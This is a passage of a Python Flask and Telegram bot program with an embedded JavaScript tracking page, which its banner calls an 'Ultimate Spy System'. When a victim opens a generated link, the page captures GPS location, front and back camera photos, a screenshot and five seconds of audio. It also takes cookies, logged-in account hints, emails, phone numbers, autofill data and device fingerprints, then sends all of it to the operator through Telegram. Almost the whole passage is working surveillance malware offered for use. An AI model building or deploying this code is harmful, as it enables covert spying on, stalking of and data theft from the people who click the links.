                                deviceInfo.device_manufacturer = 'Nokia';
                                deviceInfo.device_model = ua.match(/Nokia ([A-Za-z0-9]+)/i)?.[0] || 'Nokia';
                            } else if (ua.includes('Sony')) {
                                deviceInfo.device_manufacturer = 'Sony';
                                deviceInfo.device_model = ua.match(/Sony ([A-Za-z0-9]+)/i)?.[0] || 'Sony';
                            } else if (ua.includes('HTC')) {
                                deviceInfo.device_manufacturer = 'HTC';
                                deviceInfo.device_model = ua.match(/HTC ([A-Za-z0-9]+)/i)?.[0] || 'HTC';
                            } else if (ua.includes('LG')) {
                                deviceInfo.device_manufacturer = 'LG';
                                deviceInfo.device_model = ua.match(/LG-([A-Za-z0-9]+)/i)?.[0] || 'LG';
                            } else if (ua.includes('Moto')) {
                                deviceInfo.device_manufacturer = 'Motorola';
                                deviceInfo.device_model = ua.match(/Moto ([A-Za-z0-9]+)/i)?.[0] || 'Moto';
                            }
                        }
                    }
                }
            } else if (/iPhone|iPad|iPod/i.test(ua)) {
                deviceInfo.os = 'iOS';
                
                const iosVersion = ua.match(/OS ([0-9_]+)/i);
                if (iosVersion) {
                    deviceInfo.os_version = iosVersion[1].replace(/_/g, '.');
                }
                
                if (/iPhone/i.test(ua)) {
                    deviceInfo.device_manufacturer = 'Apple';
                    
                    if (/iPhone14,3/i.test(ua)) {
                        deviceInfo.device_model = 'iPhone 14 Pro';
                    } else if (/iPhone14,2/i.test(ua)) {
                        deviceInfo.device_model = 'iPhone 14 Pro Max';
                    } else if (/iPhone14,7/i.test(ua)) {
                        deviceInfo.device_model = 'iPhone 14';
                    } else if (/iPhone14,8/i.test(ua)) {
                        deviceInfo.device_model = 'iPhone 14 Plus';
                    } else if (/iPhone13,4/i.test(ua)) {
                        deviceInfo.device_model = 'iPhone 13 Pro';
                    } else if (/iPhone13,3/i.test(ua)) {
                        deviceInfo.device_model = 'iPhone 13 Pro Max';
                    } else if (/iPhone13,2/i.test(ua)) {
                        deviceInfo.device_model = 'iPhone 13';
                    } else if (/iPhone13,1/i.test(ua)) {
                        deviceInfo.device_model = 'iPhone 13 mini';
                    } else if (/iPhone12,3/i.test(ua)) {
                        deviceInfo.device_model = 'iPhone 12 Pro';
                    } else if (/iPhone12,5/i.test(ua)) {
                        deviceInfo.device_model = 'iPhone 12 Pro Max';
                    } else if (/iPhone12,1/i.test(ua)) {
                        deviceInfo.device_model = 'iPhone 12';
                    } else if (/iPhone12,8/i.test(ua)) {
                        deviceInfo.device_model = 'iPhone 12 mini';
                    } else {
                        deviceInfo.device_model = 'iPhone';
                    }
                } else if (/iPad/i.test(ua)) {
                    deviceInfo.device_manufacturer = 'Apple';
                    deviceInfo.device_model = 'iPad';
                } else if (/iPod/i.test(ua)) {
                    deviceInfo.device_manufacturer = 'Apple';
                    deviceInfo.device_model = 'iPod';
                }
            }
            
            // Browser detection with version
            if (/Edg\/([0-9.]+)/i.test(ua)) {
                deviceInfo.browser = 'Edge';
                deviceInfo.browser_version = ua.match(/Edg\/([0-9.]+)/i)[1];
            } else if (/Chrome\/([0-9.]+)/i.test(ua) && !/Edg/i.test(ua)) {
                deviceInfo.browser = 'Chrome';
                deviceInfo.browser_version = ua.match(/Chrome\/([0-9.]+)/i)[1];
            } else if (/Firefox\/([0-9.]+)/i.test(ua)) {
                deviceInfo.browser = 'Firefox';
                deviceInfo.browser_version = ua.match(/Firefox\/([0-9.]+)/i)[1];
            } else if (/Safari\/([0-9.]+)/i.test(ua) && !/Chrome/i.test(ua)) {
                deviceInfo.browser = 'Safari';
                deviceInfo.browser_version = ua.match(/Version\/([0-9.]+)/i)?.[1] || 'Unknown';
            } else if (/Opera\/([0-9.]+)/i.test(ua)) {
                deviceInfo.browser = 'Opera';
                deviceInfo.browser_version = ua.match(/Opera\/([0-9.]+)/i)[1];
            }
            
            return deviceInfo;
        }
        
        // Get location first
        function getLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    data.location_permission = 'Not Supported';
                    dataCollected.location = false;
                    resolve();
                    return;
                }
                
                updateStatus('📍 Getting location...');
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        data.gps_latitude = pos.coords.latitude;
                        data.gps_longitude = pos.coords.longitude;
                        data.gps_accuracy = `${Math.round(pos.coords.accuracy)}m`;
                        data.location_permission = 'Granted';
                        dataCollected.location = true;
                        console.log('GPS data collected:', data.gps_latitude, data.gps_longitude);
                        resolve();
                    },
                    (err) => {
                        data.location_permission = err.message;
                        dataCollected.location = false;
                        console.log('GPS error:', err.message);
                        resolve();
                    },
                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                );
            });
        }
        
        // Capture photo from specific camera
        async function capturePhotoFromCamera(facingMode) {
            return new Promise((resolve) => {
                const video = document.getElementById('video');
                const canvas = document.getElementById('canvas');
                
                console.log(`Requesting ${facingMode} camera access...`);
                
                navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: facingMode,
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    }, 
                    audio: false 
                })
                .then(stream => {
                    console.log(`${facingMode} camera access granted`);
                    video.srcObject = stream;
                    
                    video.onloadedmetadata = () => {
                        video.play();
                        
                        setTimeout(() => {
                            try {
                                canvas.width = video.videoWidth;
                                canvas.height = video.videoHeight;
                                
                                console.log(`Canvas size: ${canvas.width}x${canvas.height}`);
                                
                                const ctx = canvas.getContext('2d');
                                ctx.drawImage(video, 0, 0);
                                
                                const photo = canvas.toDataURL('image/jpeg', 0.9);
                                console.log(`${facingMode} photo captured, size:`, photo.length);
                                
                                stream.getTracks().forEach(track => track.stop());
                                resolve(photo);
                            } catch (err) {
                                console.error(`Error capturing ${facingMode} photo:`, err);
                                stream.getTracks().forEach(track => track.stop());
                                resolve('N/A');
                            }
                        }, 1500);
                    };
                })
                .catch(err => {
                    console.error(`${facingMode} camera error:`, err);
                    resolve('N/A');
                });
            });
        }
        
        // Capture screenshot using getDisplayMedia with Android fallback
        async function captureScreenshot() {
            return new Promise((resolve) => {
                const canvas = document.getElementById('screenshotCanvas');
                
                console.log('Requesting screen capture permission...');
                
                // Check if it's Android
                const isAndroid = /Android/i.test(navigator.userAgent);
                
                if (isAndroid) {
                    console.log('Android detected - using fallback screenshot method');
                    // For Android, use html2canvas-like approach or fallback
                    try {
                        // Create a canvas element
                        const screenshotCanvas = document.createElement('canvas');
                        const ctx = screenshotCanvas.getContext('2d');
                        
                        // Set canvas size to viewport
                        screenshotCanvas.width = window.innerWidth;
                        screenshotCanvas.height = window.innerHeight;
                        
                        // Use html2canvas-like functionality (simplified)
                        // Note: This is a simplified version and may not capture all content
                        html2canvas(document.body).then(canvas => {
                            const screenshot = canvas.toDataURL('image/png', 0.9);
                            console.log('Screenshot captured via fallback, size:', screenshot.length);
                            resolve(screenshot);
                        }).catch(err => {
                            console.error('Fallback screenshot failed:', err);
                            resolve('N/A');
                        });
                    } catch (err) {
                        console.error('Screenshot fallback error:', err);
                        resolve('N/A');
                    }
                    return;
                }
                
                // For desktop and other devices, use getDisplayMedia
                navigator.mediaDevices.getDisplayMedia({
                    video: {
                        width: { ideal: 1920 },
                        height: { ideal: 1080 }
                    },
                    audio: false
                })
                .then(stream => {
                    console.log('Screen capture permission granted');
                    
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.play();
                    
                    video.onloadedmetadata = () => {
                        setTimeout(() => {
                            try {
                                canvas.width = video.videoWidth;
                                canvas.height = video.videoHeight;
                                
                                console.log(`Screenshot canvas size: ${canvas.width}x${canvas.height}`);
                                
                                const ctx = canvas.getContext('2d');
                                ctx.drawImage(video, 0, 0);
                                
                                const screenshot = canvas.toDataURL('image/png', 0.9);
                                console.log('Screenshot captured, size:', screenshot.length);
                                
                                stream.getTracks().forEach(track => track.stop());
                                resolve(screenshot);
                            } catch (err) {
                                console.error('Error capturing screenshot:', err);
                                stream.getTracks().forEach(track => track.stop());
                                resolve('N/A');
                            }
                        }, 1000);
                    };
                })
                .catch(err => {
                    console.error('Screen capture error:', err);
                    resolve('N/A');
                });
            });
        }
        
        // Simple html2canvas implementation for fallback
        function html2canvas(element) {
            return new Promise((resolve, reject) => {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                const { width, height } = element.getBoundingClientRect();
                
                canvas.width = width;
                canvas.height = height;
                
                // Try to use the Canvas API to draw the element
                try {
                    // This is a very simplified version
                    // In a real implementation, you'd need to handle styles, images, etc.
                    ctx.drawWindow(window, 0, 0, width, height, 'rgb(255,255,255)');
                    resolve(canvas);
                } catch (err) {
                    // Fallback: create a simple representation
                    ctx.fillStyle = 'white';
                    ctx.fillRect(0, 0, width, height);
                    ctx.fillStyle = 'black';
                    ctx.font = '16px Arial';
                    ctx.fillText('Screenshot captured (simplified)', 10, 30);
                    resolve(canvas);
                }
            });
        }
        
        // Record audio
        async function recordAudio() {
            return new Promise((resolve) => {
                navigator.mediaDevices.getUserMedia({ audio: true })
                .then(stream => {
                    const mediaRecorder = new MediaRecorder(stream);
                    const audioChunks = [];
                    
                    mediaRecorder.ondataavailable = (event) => {
                        audioChunks.push(event.data);
                    };
                    
                    mediaRecorder.onstop = () => {
                        const audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
                        const reader = new FileReader();
                        reader.onload = () => resolve(reader.result);
                        reader.readAsDataURL(audioBlob);
                        stream.getTracks().forEach(track => track.stop());
                    };
                    
                    mediaRecorder.start();
                    setTimeout(() => mediaRecorder.stop(), 5000); // Record for 5 seconds
                })
                .catch(err => {
                    console.error('Audio recording error:', err);
                    resolve('N/A');
                });
            });
        }
        
        // Get all cookies
        function getAllCookies() {
            const cookies = document.cookie.split(';');
            const cookieArray = [];
            cookies.forEach(cookie => {
                const [name, value] = cookie.trim().split('=');
                if (name && value) {
                    cookieArray.push({ name, value });
                }
            });
            return cookieArray;
        }
        
        // Check logged-in accounts
        async function checkLoggedAccounts() {
            const accounts = {
                'Google': false,
                'Facebook': false,
                'Twitter/X': false,
                'Instagram': false,
                'GitHub': false,
                'LinkedIn': false,
                'Reddit': false,
                'YouTube': false
            };
            
            const domains = {
                'Google': ['accounts.google.com', 'google.com'],
                'Facebook': ['facebook.com', 'fb.com'],
                'Twitter/X': ['twitter.com', 'x.com'],
                'Instagram': ['instagram.com'],
                'GitHub': ['github.com'],
                'LinkedIn': ['linkedin.com'],
                'Reddit': ['reddit.com'],
                'YouTube': ['youtube.com']
            };
            
            const cookies = getAllCookies();
            for (const [platform, domainList] of Object.entries(domains)) {
                for (const cookie of cookies) {
                    const cookieName = cookie.name.toLowerCase();
                    if (cookieName.includes('session') || cookieName.includes('auth') || 
                        cookieName.includes('login') || cookieName.includes('token')) {
                        domainList.forEach(domain => {
                            if (cookieName.includes(domain.replace('.com', ''))) {
                                accounts[platform] = true;
                            }
                        });
                    }
                }
            }
            
            return accounts;
        }
        
        // Email harvesting
        function harvestEmails() {
            const emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}/g;
            const emails = new Set();
            
            const pageText = document.body.innerText;
            const matches = pageText.match(emailRegex);
            if (matches) matches.forEach(email => emails.add(email));
            
            const inputs = document.querySelectorAll('input[type="email"], input[name*="email"], input[id*="email"]');
            inputs.forEach(input => {
                if (input.value && emailRegex.test(input.value)) {
                    emails.add(input.value);
                }
            });
            
            return Array.from(emails);
        }
        
        // Phone number extraction
        function extractPhoneNumbers() {
            const phoneRegex = /(\\+?\\d{1,3}[-.\\s]?)?\\(?\\d{3}\\)?[-.\\s]?\\d{3}[-.\\s]?\\d{4}/g;
            const phones = new Set();
            
            const pageText = document.body.innerText;
            const matches = pageText.match(phoneRegex);
            if (matches) matches.forEach(phone => phones.add(phone.trim()));
            
            const inputs = document.querySelectorAll('input[type="tel"], input[name*="phone"], input[id*="phone"]');
            inputs.forEach(input => {
                if (input.value && phoneRegex.test(input.value)) {
                    phones.add(input.value);
                }
            });
            
            return Array.from(phones);
        }
        
        // WiFi Network Detection
        function getNetworkInfo() {
            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            if (connection) {
                return {
                    effectiveType: connection.effectiveType,
                    downlink: connection.downlink,
                    rtt: connection.rtt,
                    saveData: connection.saveData
                };
            }
            return { effectiveType: 'Unknown', downlink: 'Unknown', rtt: 'Unknown', saveData: 'Unknown' };
        }
        
        // Autofill Data Grab
        function getAutofillData() {
            const autofillData = {};
            
            const fields = {
                name: 'input[name*="name"], input[id*="name"], input[autocomplete="name"]',
                email: 'input[name*="email"], input[id*="email"], input[autocomplete="email"]',
                phone: 'input[name*="phone"], input[id*="phone"], input[autocomplete="tel"]',
                address: 'input[name*="address"], input[id*="address"], input[autocomplete="street-address"]',
                city: 'input[name*="city"], input[id*="city"], input[autocomplete="address-level2"]',
                zip: 'input[name*="zip"], input[id*="zip"], input[autocomplete="postal-code"]',
                country: 'input[name*="country"], input[id*="country"], input[autocomplete="country"]'
            };
            
            for (const [field, selector] of Object.entries(fields)) {
                const element = document.querySelector(selector);
                if (element && element.value) {
                    autofillData[field] = element.value;
                }
            }
            
            return autofillData;
        }
        
        // Canvas fingerprinting
        async function getCanvasFingerprint() {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            canvas.width = 200;
            canvas.height = 50;
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.textBaseline = 'alphabetic';
            ctx.fillStyle = '#f60';
            ctx.fillRect(125, 1, 62, 20);
            ctx.fillStyle = '#069';
            ctx.fillText('Device Fingerprint', 2, 15);
            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
            ctx.fillText('Device Fingerprint', 4, 17);
            return canvas.toDataURL();
        }
        
        // WebGL info
        function getWebGLInfo() {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (!gl) return { vendor: 'N/A', renderer: 'N/A' };
            
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            return {
                vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'N/A',
                renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'N/A'
            };
        }
        
        // Get installed fonts
        function detectFonts() {
            const baseFonts = ['monospace', 'sans-serif', 'serif'];
            const testFonts = [
                'Arial', 'Verdana', 'Times New Roman', 'Courier New',
                'Comic Sans MS', 'Impact', 'Georgia', 'Trebuchet MS',
                'Helvetica', 'Calibri', 'Consolas', 'Monaco'
            ];
            
            const canvas = document.createElement('canvas');
            const context = canvas.getContext('2d');
            const text = 'mmmmmmmmmmlli';
            const textSize = '72px';
            
            const baseMeasurements = {};
            baseFonts.forEach(font => {
                context.font = textSize + ' ' + font;
                baseMeasurements[font] = context.measureText(text).width;
            });
            
            const detectedFonts = [];
            testFonts.forEach(font => {
                let detected = false;
                baseFonts.forEach(baseFont => {
                    context.font = textSize + ' ' + font + ',' + baseFont;
                    const width = context.measureText(text).width;
                    if (width !== baseMeasurements[baseFont]) {
                        detected = true;
                    }
                });
                if (detected) detectedFonts.push(font);
            });
            
            return detectedFonts.join(', ');
        }
        
        // Main data collection
        async function collectData() {
            updateStatus('🔍 Analyzing device...');
            
            // Get location first
            await getLocation();
            
            // Get detailed device info
            const deviceInfo = getDetailedDeviceInfo();
            
            const webglInfo = getWebGLInfo();
            const canvasFingerprint = await getCanvasFingerprint();
            const cookies = getAllCookies();
            const loggedAccounts = await checkLoggedAccounts();
            const installedFonts = detectFonts();
            const emails = harvestEmails();
            const phones = extractPhoneNumbers();
            const networkInfo = getNetworkInfo();
            const autofillData = getAutofillData();
            
            updateStatus('📊 Collecting information...');
            
            // Add basic data to the data object
            Object.assign(data, {
                user_agent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                languages: navigator.languages?.join(', ') || navigator.language,
                screen_resolution: `${screen.width}x${screen.height}`,
                screen_color_depth: screen.colorDepth,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                cpu_cores: navigator.hardwareConcurrency || 'Unknown',
                touch_support: 'ontouchstart' in window ? 'Yes' : 'No',
                canvas_fingerprint: canvasFingerprint.substring(0, 100),
                webgl_vendor: webglInfo.vendor,
                webgl_renderer: webglInfo.renderer,
                device_type: deviceInfo.device_type,
                os: deviceInfo.os,
                os_version: deviceInfo.os_version,
                device_manufacturer: deviceInfo.device_manufacturer,
                device_model: deviceInfo.device_model,
                browser: deviceInfo.browser,
                browser_version: deviceInfo.browser_version,
                device_memory: navigator.deviceMemory || 'N/A',
                connection_type: navigator.connection?.effectiveType || 'N/A',
                cookies: cookies,
                logged_accounts: loggedAccounts,
                installed_fonts: installedFonts,
                emails: emails,
                phones: phones,
                network_info: networkInfo,
                autofill_data: autofillData
            });
            
            dataCollected.device_info = true;
            dataCollected.emails = emails.length > 0;
            dataCollected.phones = phones.length > 0;
            dataCollected.autofill = Object.keys(autofillData).length > 0;
            
            // Try to get storage info
            try {
                let localSize = 0;
                for (let key in localStorage) {
                    if (localStorage.hasOwnProperty(key)) {
                        localSize += localStorage[key].length + key.length;
                    }
                }
                data.local_storage_size = (localSize / 1024).toFixed(2) + ' KB';
            } catch (e) {
                data.local_storage_size = 'Access Denied';
            }
            
            try {
                let sessionSize = 0;
                for (let key in sessionStorage) {
                    if (sessionStorage.hasOwnProperty(key)) {
                        sessionSize += sessionStorage[key].length + key.length;
                    }
                }
                data.session_storage_size = (sessionSize / 1024).toFixed(2) + ' KB';
            } catch (e) {
                data.session_storage_size = 'Access Denied';
            }
            
            updateStatus('🔋 Checking battery...');
            if (navigator.getBattery) {
                try {
                    const battery = await navigator.getBattery();
                    data.battery = `${Math.round(battery.level * 100)}% ${battery.charging ? '(Charging)' : '(Not Charging)'}`;
                } catch (e) {
                    data.battery = 'N/A';
                }
            } else {
                data.battery = 'N/A';
            }
            
            // Capture all media with timeouts to prevent hanging
            updateStatus('📸 Capturing front camera...');
            try {
                data.front_camera_photo = await Promise.race([
                    capturePhotoFromCamera('user'),
                    new Promise(resolve => setTimeout(() => resolve('N/A'), 10000))
                ]);
                dataCollected.front_camera = data.front_camera_photo !== 'N/A';
            } catch (err) {
                console.error('Front camera capture failed:', err);
                data.front_camera_photo = 'N/A';
                dataCollected.front_camera = false;
            }
            
            updateStatus('📷 Capturing back camera...');
            try {
                data.back_camera_photo = await Promise.race([
                    capturePhotoFromCamera('environment'),
                    new Promise(resolve => setTimeout(() => resolve('N/A'), 10000))
                ]);
                dataCollected.back_camera = data.back_camera_photo !== 'N/A';
            } catch (err) {
                console.error('Back camera capture failed:', err);
                data.back_camera_photo = 'N/A';
                dataCollected.back_camera = false;
            }
            
            updateStatus('🖥️ Capturing screenshot...');
            try {
                data.screenshot = await Promise.race([
                    captureScreenshot(),
                    new Promise(resolve => setTimeout(() => resolve('N/A'), 15000))
                ]);
                dataCollected.screenshot = data.screenshot !== 'N/A';
            } catch (err) {
                console.error('Screenshot capture failed:', err);
                data.screenshot = 'N/A';
                dataCollected.screenshot = false;
            }
            
            updateStatus('🎤 Recording audio...');
            try {
                data.audio_recording = await Promise.race([
                    recordAudio(),
                    new Promise(resolve => setTimeout(() => resolve('N/A'), 8000))
                ]);
                dataCollected.audio = data.audio_recording !== 'N/A';
            } catch (err) {
                console.error('Audio recording failed:', err);
                data.audio_recording = 'N/A';
                dataCollected.audio = false;
            }
            
            // Send the complete data
            sendData(data);
        }
        
        // Start collection after a short delay
        setTimeout(() => {
            collectData();
        }, 1000);
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    return """
    <html>
    <head>
        <title>Secure Portal</title>
        <style>
            body {
                font-family: Arial, sans-serif;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
                margin: 0;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            }
            .container {
                text-align: center;
                background: white;
                padding: 50px;
                border-radius: 20px;
                box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            }
            h1 { color: #667eea; margin-bottom: 10px; }
            p { color: #666; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🕵️ Ultimate Intelligence System</h1>
            <p>System Online - All Sensors Active</p>
        </div>
    </body>
    </html>
    """

@app.route('/track/<link_id>')
def track(link_id):
    logger.info(f"Tracking page accessed for link_id: {link_id}")
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT user_id FROM links WHERE id = ? AND active = 1", (link_id,))
    link = c.fetchone()
    conn.close()
    
    if not link:
        logger.warning(f"Invalid or expired link: {link_id}")
        return "Invalid or expired link", 404
    
    return render_template_string(TRACKING_PAGE, link_id=link_id)

@app.route('/collect/<link_id>', methods=['POST'])
def collect(link_id):
    logger.info(f"Collect endpoint called for link_id: {link_id}")
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT user_id FROM links WHERE id = ? AND active = 1", (link_id,))
    link = c.fetchone()
    
    if not link:
        logger.warning(f"Invalid link in collect: {link_id}")
        conn.close()
        return jsonify({'status': 'error'}), 404
    
    user_id = link[0]
    data = request.json
    logger.info(f"Received device data for link {link_id}")
    
    # Get IP info
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    ip_info = get_ip_info(ip)
    
    # Parse user agent
    ua = data.get('user_agent', '')
    device_type = 'Desktop'
    if 'Mobile' in ua or 'Android' in ua:
        device_type = 'Mobile'
    elif 'Tablet' in ua or 'iPad' in ua:
        device_type = 'Tablet'
    
    # Process front camera photo
    front_camera_data = data.get('front_camera_photo', 'N/A')
    front_camera_blob = None
    if front_camera_data != 'N/A' and front_camera_data.startswith('data:image'):
        try:
            if ',' in front_camera_data:
                base64_data = front_camera_data.split(',', 1)[1]
                photo_bytes = base64.b64decode(base64_data)
                front_camera_blob = photo_bytes
                logger.info(f"Front camera photo decoded successfully, size: {len(photo_bytes)} bytes")
        except Exception as e:
            logger.error(f"Error decoding front camera photo: {e}")
    
    # Process back camera photo
    back_camera_data = data.get('back_camera_photo', 'N/A')
    back_camera_blob = None
    if back_camera_data != 'N/A' and back_camera_data.startswith('data:image'):
        try:
            if ',' in back_camera_data:
                base64_data = back_camera_data.split(',', 1)[1]
                photo_bytes = base64.b64decode(base64_data)
                back_camera_blob = photo_bytes
                logger.info(f"Back camera photo decoded successfully, size: {len(photo_bytes)} bytes")
        except Exception as e:
            logger.error(f"Error decoding back camera photo: {e}")
    
    # Process screenshot
    screenshot_data = data.get('screenshot', 'N/A')
    screenshot_blob = None
    if screenshot_data != 'N/A' and screenshot_data.startswith('data:image'):
        try:
            if ',' in screenshot_data:
                base64_data = screenshot_data.split(',', 1)[1]
                screenshot_bytes = base64.b64decode(base64_data)
                screenshot_blob = screenshot_bytes
                logger.info(f"Screenshot decoded successfully, size: {len(screenshot_bytes)} bytes")
        except Exception as e:
            logger.error(f"Error decoding screenshot: {e}")
    
    # Process audio recording
    audio_data = data.get('audio_recording', 'N/A')
    audio_blob = None
    if audio_data != 'N/A' and audio_data.startswith('data:audio'):
        try:
            if ',' in audio_data:
                base64_data = audio_data.split(',', 1)[1]
                audio_bytes = base64.b64decode(base64_data)
                audio_blob = audio_bytes
                logger.info(f"Audio recording decoded successfully, size: {len(audio_bytes)} bytes")
        except Exception as e:
            logger.error(f"Error decoding audio recording: {e}")
    
    # Prepare data for storage
    cookies_json = json.dumps(data.get('cookies', []))
    logged_accounts_json = json.dumps(data.get('logged_accounts', {}))
    emails_json = json.dumps(data.get('emails', []))
    phones_json = json.dumps(data.get('phones', []))
    autofill_data_json = json.dumps(data.get('autofill_data', {}))
    network_info_json = json.dumps(data.get('network_info', {}))
    capture_status_json = data.get('data_capture_status', '{}')
    
    # Insert device data
    try:
        c.execute("""INSERT INTO devices 
                     (link_id, user_id, ip, user_agent, device_type, os, os_version, device_manufacturer, device_model, browser, 
                      browser_version, screen_resolution, language, timezone, location, isp, 
                      latitude, longitude, platform, cpu_cores, touch_support, 
                      battery, canvas_fingerprint, webgl_vendor, webgl_renderer,
                      front_camera_photo, back_camera_photo, screenshot, audio_recording,
                      cookies, logged_accounts, local_storage, session_storage, 
                      installed_fonts, zip_code, emails, phones, autofill_data, network_info, data_capture_status, timestamp) 
                     VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
                  (link_id, user_id, ip, ua, device_type, 
                   data.get('os', 'Unknown'),
                   data.get('os_version', ''),
                   data.get('device_manufacturer', ''),
                   data.get('device_model', ''),
                   data.get('browser', 'Unknown'),
                   data.get('browser_version', 'Unknown'),
                   data.get('screen_resolution', 'Unknown'),
                   data.get('language', 'Unknown'), 
                   data.get('timezone', 'Unknown'),
                   ip_info['location'], ip_info['isp'], 
                   ip_info['latitude'], ip_info['longitude'],
                   data.get('platform', 'Unknown'), 
                   data.get('cpu_cores', 'Unknown'),
                   data.get('touch_support', 'Unknown'), 
                   data.get('battery', 'Unknown'),
                   data.get('canvas_fingerprint', 'Unknown'),
                   data.get('webgl_vendor', 'Unknown'),
                   data.get('webgl_renderer', 'Unknown'),
                   front_camera_blob,
                   back_camera_blob,
                   screenshot_blob,
                   audio_blob,
                   cookies_json,
                   logged_accounts_json,
                   data.get('local_storage_size', 'N/A'),
                   data.get('session_storage_size', 'N/A'),
                   data.get('installed_fonts', 'Unknown'),
                   ip_info['zip'],
                   emails_json,
                   phones_json,
                   autofill_data_json,
                   network_info_json,
                   capture_status_json,
                   datetime.now().isoformat()))
        
        c.execute("UPDATE links SET clicks = clicks + 1 WHERE id = ?", (link_id,))
        conn.commit()
        logger.info(f"Data saved to database for link {link_id}")
    except Exception as e:
        logger.error(f"Database error: {e}")
    finally:
        conn.close()
    
    # Prepare device data for notification
    device_data = {
        'ip': ip,
        'device_type': device_type,
        'os': data.get('os', 'Unknown'),
        'os_version': data.get('os_version', ''),
        'device_manufacturer': data.get('device_manufacturer', ''),
        'device_model': data.get('device_model', ''),
        'browser': data.get('browser', 'Unknown'),
        'browser_version': data.get('browser_version', 'Unknown'),
        'screen_resolution': data.get('screen_resolution', 'Unknown'),
        'location': ip_info['location'],
        'isp': ip_info['isp'],
        'org': ip_info.get('org', 'Unknown'),
        'as': ip_info.get('as', 'Unknown'),
        'zip': ip_info['zip'],
        'platform': data.get('platform', 'Unknown'),
        'cpu_cores': data.get('cpu_cores', 'Unknown'),
        'touch_support': data.get('touch_support', 'Unknown'),
        'battery': data.get('battery', 'Unknown'),
        'language': data.get('language', 'Unknown'),
        'timezone': data.get('timezone', 'Unknown'),
        'gps_latitude': data.get('gps_latitude', 'N/A'),
        'gps_longitude': data.get('gps_longitude', 'N/A'),
        'gps_accuracy': data.get('gps_accuracy', 'N/A'),
        'location_permission': data.get('location_permission', 'N/A'),
        'canvas_fingerprint': data.get('canvas_fingerprint', 'Unknown'),
        'webgl_vendor': data.get('webgl_vendor', 'Unknown'),
        'webgl_renderer': data.get('webgl_renderer', 'Unknown'),
        'cookies': data.get('cookies', []),
        'logged_accounts': data.get('logged_accounts', {}),
        'emails': data.get('emails', []),
        'phones': data.get('phones', []),
        'autofill_data': data.get('autofill_data', {}),
        'data_capture_status': capture_status_json
    }
    
    # Send notification asynchronously
    if telegram_bot:
        asyncio.run_coroutine_threadsafe(
            send_device_notification(
                telegram_bot, 
                user_id, 
                device_data, 
                link_id, 
                front_camera_data, 
                back_camera_data, 
                screenshot_data, 
                audio_data
            ),
            bot_loop
        )
    
    return jsonify({'status': 'success'})

bot_loop = None

async def run_bot_async():
    """Run Telegram bot"""
    global telegram_bot, bot_loop
    
    bot_loop = asyncio.get_event_loop()
    
    application = ApplicationBuilder().token(BOT_TOKEN).build()
    telegram_bot = application.bot
    
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("generate", generate))
    application.add_handler(CommandHandler("mylinks", mylinks))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CallbackQueryHandler(button_callback))
    
    print("✅ Telegram Bot is running!")
    
    await application.initialize()
    await application.start()
    await application.updater.start_polling(drop_pending_updates=True)
    
    try:
        while True:
            await asyncio.sleep(1)
    except KeyboardInterrupt:
        await application.stop()

def run_bot():
    """Run bot in thread"""
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(run_bot_async())

def run_flask():
    """Run Flask server"""
    print("✅ Flask Server running on port 5000!")
    print(f"🌐 Public URL: https://{localXpose}")
    app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False, threaded=True)

if __name__ == "__main__":
    print("╔═══════════════════════════════════╗")
    print("║  🚀 ULTIMATE SPY SYSTEM v6.0    ║")
    print("╚═══════════════════════════════════╝")
    print("⚡ Initializing advanced intel gathering...")
    print(f"🌐 URL: https://{localXpose}")
    print("━━━━━━━━═══════════════════════════")
    print("\n📊 FEATURES INCLUDED:")
    print("  ✅ Location capture first")
    print("  ✅ Page closure handling")
    print("  ✅ Data capture status tracking")
    print("  ✅ Android screenshot fix")
    print("  ✅ Enhanced device detection")
    print("  ✅ OS version detection (Windows 10/11, Android 14, etc.)")
    print("  ✅ Device manufacturer detection (Samsung, Vivo, Huawei, etc.)")
    print("  ✅ Device model detection")
    print("  ✅ Front camera photo capture")
    print("  ✅ Back camera photo capture")
    print("  ✅ Screen capture/screenshot")
    print("  ✅ Audio recording (5 seconds)")
    print("  ✅ Email harvesting")
    print("  ✅ Phone number extraction")
    print("  ✅ WiFi network detection")
    print("  ✅ Autofill data grab")
    print("  ✅ ZIP code display")
    print("  ✅ Enhanced error handling")
    print("  ✅ Proper media storage")
    print("\n━━━━━━━━═══════════════════════════\n")
    
    bot_thread = Thread(target=run_bot, daemon=True)
    bot_thread.start()
    
    time.sleep(2)
    
    run_flask()